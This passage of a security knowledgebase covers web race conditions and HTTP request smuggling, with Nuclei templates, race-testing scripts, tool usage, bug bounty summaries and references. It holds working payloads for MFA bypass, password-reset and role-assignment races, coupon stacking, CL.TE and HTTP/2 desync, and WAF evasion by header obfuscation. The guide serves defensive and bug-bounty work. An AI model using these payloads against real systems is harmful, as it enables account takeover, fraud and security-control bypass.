   - Email content differences
   - Application behavior changes
   - Session state changes
```

**Clue Types:**
- Response status/body changes
- Processing time anomalies (faster = background thread; slower = locking)
- Second-order effects (emails, session changes)
- Error messages appearing inconsistently

**Chaos Strategy:**
```
- Send large number of requests (20-30)
- Target all relevant code paths
- Use different input values
- Look for ANY deviation from baseline
```

#### Phase 3: Prove the Concept

**Minimize Variables:**
- Reduce to 2 requests (most vulnerabilities exploitable with 2)
- Remove unnecessary requests
- Retry multiple times
- Automate if intermittent

**Escalation:**
- Think of race condition as structural weakness
- Look for unusual primitives (email misrouting, state inconsistency)
- Chain with other vulnerabilities
- Don't overlook exploit avenues (missed $5k opportunity documented)

### Endpoint Prioritization

**High Value Targets:**
1. Authentication endpoints (login, MFA, password reset)
2. Financial operations (payment, transfer, coupon)
3. State-changing operations (email change, role update)
4. Resource-limited operations (invitations, group creation)
5. Multi-step workflows (checkout, registration)

**Low Value Targets:**
- Read-only endpoints
- Static content
- Operations with no security impact
- Client-side state only

---

## Nuclei Templates

### Basic Race Condition Template

```yaml
id: race-condition-testing

info:
  name: Race Condition Testing
  author: pdteam
  severity: info

http:
  - raw:
      - |
        POST /coupons HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        promo_code=20OFF

    race: true
    race_count: 10

    matchers:
      - type: status
        part: header
        status:
          - 200
```

### Multi-Request Race Template

```yaml
id: multi-request-race

info:
  name: Multi-Request Race Condition
  author: custom
  severity: high

http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: session={{session}}

        username={{username}}&password={{password}}

      - |
        GET /admin HTTP/1.1
        Host: {{Hostname}}
        Cookie: session={{session}}

    race: true
    threads: 2

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 302"
          - "status_code_2 == 200"
        condition: and
```

### Rate Limit Bypass Template

```yaml
id: rate-limit-bypass

info:
  name: Rate Limit Bypass via Race Condition
  author: custom
  severity: medium

http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}

    race: true
    race_count: 25

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(body, 'Invalid') == false"
        condition: and
```

### Running Nuclei Race Templates

```bash
# Basic race condition test
nuclei -t race-condition.yaml -target https://api.target.com

# With proxy for debugging
nuclei -t race-condition.yaml -target https://api.target.com -proxy http://127.0.0.1:8080

# Multiple targets
nuclei -t race-condition.yaml -list targets.txt

# Rate-limited testing
nuclei -t rate-limit.yaml -target https://target.com/login -rate-limit 100
```

---

## Tools and Scanners

### Turbo Intruder

**Purpose**: High-speed, complex HTTP attacks
**Features**:
- Hand-coded HTTP stack for speed
- Python-based configuration
- Single-packet attack support (HTTP/2)
- Last-byte sync support (HTTP/1.1)
- Flat memory usage for multi-day attacks
- Headless/command-line operation

**Installation**:
1. Burp Suite: Extender → BApp Store → Turbo Intruder
2. Manual: Download JAR, load via Extender → Extensions → Add

**Key Templates**:
- `race-single-packet-attack.py` — HTTP/2 single-packet
- `race-last-byte-sync.py` — HTTP/1.1 last-byte sync
- `email-extraction.py` — Automated email token extraction

### HTTP Request Smuggler

**Purpose**: Automated HTTP desync detection and exploitation
**Features**:
- Parser discrepancy detection (v3.0+)
- CL.TE and TE.CL detection
- HTTP/2 downgrade detection
- Client-side desync detection
- Connection state manipulation
- Pause-based desync
- Turbo Intruder integration

**Installation**: Extender → BApp Store → HTTP Request Smuggler

**Usage**:
```
1. Right-click request → Launch Smuggle probe
2. Watch Organizer and Output tabs
3. Right-click chunked request → Launch Smuggle attack
4. Edit 'prefix' variable in Turbo Intruder window
```

### Smuggler (defparam)

**Purpose**: Python-based HTTP request smuggling testing
**Installation**:
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u <URL>
```

**Usage**:
```bash
# Single host
python3 smuggler.py -u https://target.com

# List of hosts
cat targets.txt | python3 smuggler.py

# Custom method
python3 smuggler.py -u https://target.com -m GET

# Custom config
python3 smuggler.py -u https://target.com -c custom.py

# Exit on first finding
python3 smuggler.py -u https://target.com -x
```

**Configuration Files**:
- `default.py` — Fast, standard mutations
- `doubles.py` — Niche, slow mutations
- `exhaustive.py` — Very slow, comprehensive

### Raceocat (JavanXD)

**Purpose**: Race condition exploitation efficiency
**Features**:
- Simplified race condition testing
- GUI interface
- Automated detection

### h2spacex (nxenon)

**Purpose**: HTTP/2 single-packet attack low-level library
**Features**:
- Based on Scapy
- Exploit timing attacks
- Custom HTTP/2 frame crafting

### Burp Suite Repeater

**Built-in Race Features (2023.9+)**:
- Tab groups for parallel sending
- Single-packet attack (HTTP/2)
- Last-byte sync (HTTP/1.1)
- Send group in sequence (separate connections)
- Send group in parallel

**Workflow**:
```
1. Send request to Repeater
2. Add to group
3. Duplicate tabs (20-30x)
4. Send group in parallel
```

### Custom Scripts

#### Go Race Condition Tester

```go
package main

import (
    "fmt"
    "net/http"
    "strings"
    "sync"
    "time"
)

func main() {
    url := "https://target.com/api/action"
    data := strings.NewReader("param=value")
    numReqs := 20

    var wg sync.WaitGroup
    wg.Add(numReqs)

    start := time.Now().Add(100 * time.Millisecond)

    for i := 0; i < numReqs; i++ {
        go func() {
            defer wg.Done()
            time.Sleep(time.Until(start))

            resp, err := http.Post(url, "application/x-www-form-urlencoded", data)
            if err != nil {
                fmt.Println("Error:", err)
                return
            }
            fmt.Println("Status:", resp.StatusCode)
        }()
    }

    wg.Wait()
}
```

---

## Advanced Research

### Single-Packet Attack Evolution

**Current State**: HTTP/2, 20-30 requests, ~1ms spread
**Future Directions**:
- HTTP/3 over QUIC (limited by 1500 byte UDP datagram)
- TCP max packet size exploitation (65,535 bytes = ~800 requests)
- WebSocket via HTTP/2 nesting (RFC 8441)
- TLS record coalescing (bypassing SOCKS proxies)

### Beyond the Limit: Expanding Single-Packet Attack

**Research**: RyotaK (2024)
**Concept**: First sequence sync for breaking 65,535 byte limit
**Potential**: 800+ simultaneous requests

### Browser-Powered Desync Evolution

**Current**: HTTP/1.1 connection pool poisoning
**Future**:
- HTTP/2 downgrades via forward proxies
- Corporate proxy exploitation
- IoT device targeting
- MITM-powered desync on Apache

### Cache Poisoning + Race Chains

**Emerging Techniques**:
- Race condition to cache poisoning (Next.js Eclipse)
- Framework-level cache bypasses
- CDN-specific normalization abuse
- Internal cache poisoning (WP Rocket, etc.)

### TOCTOU in Modern Architectures

**Serverless/Lambda**:
- Cold start delays create race windows
- Execution time limits affect timing
- State persistence between invocations

**Microservices**:
- Distributed state increases complexity
- Service mesh adds latency
- Event-driven architectures create queues

**GraphQL**:
- Batched queries create natural race conditions
- Resolver-level concurrency
- Subscription state management

---

## Bug Bounty Writeups

### Writeup 1: GitLab CVE-2022-4037

**Researcher**: James Kettle
**Program**: GitLab HackerOne
**Bounty**: Medium (personally argued High)
**CVE**: CVE-2022-4037

**Summary**: Race condition in email confirmation allowed hijacking email verification, leading to account takeover and OpenID hijacking.

**Key Lessons**:
- Email operations are excellent race condition targets
- Background threads increase race likelihood
- Template engine database reads create race windows
- No-clue vulnerabilities require automation

### Writeup 2: Tesla Free Upgrades

**Year**: 2020
**Impact**: Free vehicle software upgrades
**Technique**: Multiple simultaneous purchase requests

**Key Lessons**:
- Payment endpoints are high-value targets
- Single-packet attack makes remote races local
- Financial impact = higher bounty potential

### Writeup 3: Uber Infinite Credits

**Year**: 2016
**Impact**: Infinite promotional credits
**Technique**: Race condition in promo redemption

**Key Lessons**:
- Credit/promo systems are classic limit-overrun targets
- Simple concurrency bugs = high impact
- Early bug bounty era = less competition

### Writeup 4: Cloudflare 24M Site Takeover

**Researchers**: Wannes Verwimp, James Kettle
**Bounty**: $7,000
**Impact**: 24,000,000 websites

**Key Lessons**:
- Infrastructure-level bugs have massive blast radius
- Accidental discoveries can be most impactful
- Cache + desync = devastating combination
- Report quickly, patch fast

### Writeup 5: Platform Limit Bypasses (2026)

**Researcher**: Montaser Mohsen
**Impact**: Subscription limit bypass, group limit bypass
**Technique**: 20-25 parallel requests

**Key Lessons**:
- SaaS platforms have numerous limit-overrun opportunities
- Project/group limits are often overlooked
- Simple parallel requests = serious business logic flaws

---

## Payload Collections

### Race Condition Payloads by Category

#### Authentication Race Payloads

```http
# MFA Bypass
POST /login HTTP/2
Host: {{Hostname}}
Cookie: session={{session}}

username={{username}}&password={{password}}
---
GET /admin HTTP/2
Host: {{Hostname}}
Cookie: session={{session}}
```

```http
# Password Reset Race
POST /reset-password HTTP/2
Host: {{Hostname}}
Cookie: session={{session}}

email=victim@example.com
---
POST /reset-password HTTP/2
Host: {{Hostname}}
Cookie: session={{session}}

email=attacker@example.com
```

#### Financial Race Payloads

```http
# Coupon Stacking
POST /cart/coupon HTTP/2
Host: {{Hostname}}
Cookie: session={{session}}

promo_code=50OFF
```

```http
# Payment Race
POST /api/payment HTTP/2
Host: {{Hostname}}
Authorization: Bearer {{token}}

{"amount": 1.00, "currency": "USD"}
---
POST /api/cart/update HTTP/2
Host: {{Hostname}}
Authorization: Bearer {{token}}

{"item_id": 123, "price": 0.01}
```

#### Resource Limit Payloads

```http
# Group Creation Limit
POST /api/groups HTTP/2
Host: {{Hostname}}
Authorization: Bearer {{token}}

{"name": "group{{random}}"}
```

```http
# Invitation Limit
POST /api/invite HTTP/2
Host: {{Hostname}}
Authorization: Bearer {{token}}

{"email": "user{{random}}@example.com"}
```

#### State Manipulation Payloads

```http
# Email Change Race
POST /api/change-email HTTP/2
Host: {{Hostname}}
Cookie: session={{session}}

email=new1@example.com
---
POST /api/change-email HTTP/2
Host: {{Hostname}}
Cookie: session={{session}}

email=new2@example.com
```

```http
# Role Assignment Race
POST /api/assign-role HTTP/2
Host: {{Hostname}}
Cookie: session={{session}}

role=admin
---
POST /api/assign-role HTTP/2
Host: {{Hostname}}
Cookie: session={{session}}

role=user
```

### Request Smuggling + Race Payloads

```http
# CL.TE Desync
POST / HTTP/1.1
Host: {{Hostname}}
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X: y
```

```http
# H2.0 Desync
POST /b/ HTTP/2
Host: {{Hostname}}
Content-Length: 23

GET /404 HTTP/1.1
X: X
```

```http
# 0.CL Desync with Early Response
GET /con HTTP/1.1
Host: {{Hostname}}
Content-Length: 7

GET /404 HTTP/1.1
X: Y
```

---

## WAF Bypasses

### Bypassing WAF Rate Limits

**Technique**: Race condition during rate limit counter update

```
[WAF Check] ----> [Process Request] ----> [Increment Counter]
       ^                                    |
       |                                    |
       +---- Race Window: Multiple requests pass check before counter updated
```

### Bypassing WAF Request Inspection

**Technique**: Smuggle malicious request inside benign outer request

```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Length: 50
Transfer-Encoding: chunked

5
 benign
0

POST /admin HTTP/1.1
Host: {{Hostname}}

malicious=data
```

### WAF Evasion via Parser Confusion

```http
# Header obfuscation to bypass regex-based WAF
Transfer-Encoding\x00: chunked
Content-Length\x00: 5
```

```http
# Case variation
TRANSFER-ENCODING: chunked
transfer-encoding: chunked
TrAnSfEr-EnCoDiNg: chunked
```

```http
# Whitespace abuse
Transfer-Encoding:  chunked
Transfer-Encoding:	chunked
Transfer-Encoding:
chunked
```

---

## Detection Techniques

### Manual Detection

**Step 1: Identify Targets**
- Map state-changing endpoints
- Identify rate-limited or single-use functionality
- Look for multi-step workflows

**Step 2: Baseline Behavior**
```
- Send requests sequentially with delays
- Record response times, status codes, body content
- Note any email/SMS notifications sent
- Document session state changes
```

**Step 3: Parallel Testing**
```
- Send 20-30 identical requests simultaneously
- Use single-packet attack (HTTP/2) or last-byte sync (HTTP/1.1)
- Compare responses to baseline
- Look for:
  * Different response counts (e.g., 6 success vs 1 expected)
  * Inconsistent error messages
  * Different processing times
  * Second-order effects (emails, state changes)
```

**Step 4: Prove Concept**
```
- Reduce to minimum requests needed (usually 2)
- Repeat to confirm reproducibility
- Measure impact (financial, access, data)
- Document race window characteristics
```

### Automated Detection

**Using Turbo Intruder:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Baseline: sequential
    for i in range(5):
        engine.queue(target.req)

    # Race: parallel
    for i in range(20):
        engine.queue(target.req, gate='race')
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
    # Automated analysis: compare response patterns
```

**Using Nuclei:**
```yaml
id: automated-race-detection

info:
  name: Automated Race Condition Detection
  author: custom
  severity: info

http:
  - raw:
      - |
        {{method}} {{path}} HTTP/1.1
        Host: {{Hostname}}
        {{headers}}

        {{body}}

    race: true
    race_count: 20

    matchers:
      - type: dsl
        dsl:
          - "len(responses) > 1"
          - "status_code_1 == 200 && status_code_2 == 200"
```

**Using Custom Scripts:**
```python
import asyncio
import aiohttp

async def detect_race(url, headers, data, num_requests=20):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(num_requests):
            task = session.post(url, headers=headers, data=data)
            tasks.append(task)

        responses = await asyncio.gather(*tasks)

        success_count = sum(1 for r in responses if r.status == 200)
        if success_count > 1:
            print(f"Potential race condition: {success_count} successes")
            return True
        return False
```

### Clue Analysis

**Response Time Analysis:**
- Faster than expected → Background thread processing (higher race likelihood)
- Slower than expected → Possible locking (try different sessions)
- Inconsistent → Server-side jitter or load-dependent behavior

**Second-Order Detection:**
- Check email inboxes for multiple/duplicate messages
- Monitor session state after attack
- Verify database state changes
- Test for deferred effects (check after delay)

---

## References

### Primary Sources

1. **PortSwigger Web Security Academy - Race Conditions**
   - https://portswigger.net/web-security/race-conditions

2. **Smashing the State Machine: The True Potential of Web Race Conditions** (Black Hat USA 2023)
   - https://portswigger.net/research/smashing-the-state-machine
   - James Kettle (@albinowax)

3. **The Single-Packet Attack: Making Remote Race Conditions Local**
   - https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local
   - James Kettle

4. **HTTP/1.1 Must Die: The Desync Endgame**
   - https://portswigger.net/research/http1-must-die
   - James Kettle (2025)

5. **Browser-Powered Desync Attacks**
   - https://portswigger.net/research/browser-powered-desync-attacks
   - James Kettle (Black Hat USA 2022)

6. **Web Cache Entanglement**
   - https://portswigger.net/research/web-cache-entanglement
   - James Kettle (Black Hat USA 2020)

7. **Hidden OAuth Attack Vectors**
   - https://portswigger.net/research/hidden-oauth-attack-vectors
   - James Kettle

8. **Practical Web Cache Poisoning**
   - https://portswigger.net/research/practical-web-cache-poisoning
   - James Kettle

### Tools & Frameworks

9. **Turbo Intruder**
   - https://github.com/PortSwigger/turbo-intruder
   - PortSwigger

10. **HTTP Request Smuggler**
    - https://github.com/PortSwigger/http-request-smuggler
    - PortSwigger (v3.0 with parser discrepancy detection)

11. **Smuggler**
    - https://github.com/defparam/smuggler
    - @defparam

12. **Nuclei Templates - Race Conditions**
    - https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/race-condition
    - ProjectDiscovery

13. **PayloadsAllTheThings - Race Condition**
    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Race%20Condition
    - @swisskyrepo

14. **Raceocat**
    - https://github.com/JavanXD/Raceocat
    - JavanXD

15. **h2spacex**
    - https://github.com/nxenon/h2spacex
    - nxenon

### Additional Resources

16. **HackTricks - Race Conditions**
    - https://book.hacktricks.wiki/en/pentesting-web/race-condition.html

17. **Race Conditions on the Web** (2016)
    - https://jospfrj.blogspot.com/2016/07/race-conditions-on-web.html
    - Josip Franjkovic

18. **Turbo Intruder: Embracing the Billion-Request Attack**
    - https://portswigger.net/blog/turbo-intruder-embracing-the-billion-request-attack
    - James Kettle

19. **Beyond the Limit: Expanding Single-Packet Race Condition**
    - https://blog.ryotak.net/post/beyond-the-limit-expanding-single-packet-race-condition/
    - RyotaK (2024)

20. **A Race to the Bottom - Database Transactions Undermining Your AppSec**
    - Viktor Chuchurski

21. **Atomicity for Agents: Exposing, Exploiting, and Mitigating TOCTOU Vulnerabilities**
    - https://arxiv.org/html/2603.00476v1
    - Academic research on browser-use agent TOCTOU

22. **Guide to Identifying and Exploiting TOCTOU Race Conditions**
    - https://fdzdev.medium.com/guide-to-identifying-and-exploiting-toctou-race-conditions-in-web-applications-c5f233e32b7f

23. **Bug Bounty Race: Exploiting Race Conditions for Infinite Discounts**
    - https://infosecwriteups.com/bug-bounty-race-exploiting-race-conditions-for-infinite-discounts-a2cb2f233804

24. **Exploiting Race Conditions to Bypass Platform Limits**
    - https://medium.com/@montaser_mohsen/exploiting-race-conditions-to-bypass-platform-limits-06ccc9c9c03a

25. **Eclipse on Next.js: Conditioned Exploitation of an Intended Race-Condition**
    - https://zhero-web-sec.github.io/research-and-things/eclipse-on-nextjs-conditioned-exploitation-of-an-intended-race-condition

### Bug Bounty Programs

- GitLab HackerOne
- Amazon VDP
- Cloudflare VDP
- Tesla VDP
- Uber (historical)
- Akamai VDP
- Cisco VDP
- Pulse Secure VDP

---

## Quick Reference Card

### Attack Decision Tree

```
Start
  |
  +-- HTTP/2 supported? --YES--> Single-Packet Attack (20-30 req)
  |                                |
  |                                +-- Success? --YES--> Exploit
  |                                |
  |                                +-- No? --> Connection Warming
  |                                              |
  |                                              +-- Retry
  |
  +-- HTTP/2 not supported? --NO--> Last-Byte Sync (HTTP/1.1)
                                     |
                                     +-- High jitter? --> Rate Limit Abuse
                                     |                     |
                                     |                     +-- Slow down fast endpoint
                                     |
                                     +-- Low jitter? --> Direct Exploit
```

### Endpoint Testing Priority

```
CRITICAL (Test First):
[ ] Login/MFA endpoints
[ ] Password reset
[ ] Payment/checkout
[ ] Coupon/promo code application
[ ] Fund transfer/withdrawal
[ ] Role/privilege assignment
[ ] Email/phone verification

HIGH (Test Second):
[ ] Resource creation (groups, projects)
[ ] Invitation systems
[ ] Rating/voting systems
[ ] Inventory/stock operations
[ ] API key generation
[ ] Token refresh

MEDIUM (Test Third):
[ ] Profile updates
[ ] Settings changes
[ ] Content publishing
[ ] Message sending
[ ] Notification triggers
```

### Response Analysis Checklist

```
[ ] Count success vs expected responses
[ ] Compare response bodies for differences
[ ] Check response times for anomalies
[ ] Verify session state changes
[ ] Check email/SMS for duplicates
[ ] Test for second-order effects (wait 1-5 minutes)
[ ] Verify database state directly if possible
[ ] Check for partial construction artifacts
[ ] Look for inconsistent error messages
[ ] Verify if attack persists after session refresh
```

---

*This knowledgebase is compiled from public research, bug bounty writeups, and academic papers. Always test responsibly and within program scope. Race condition testing can cause unintended side effects — use caution in production environments.*

*Last Updated: 2026-05-24*
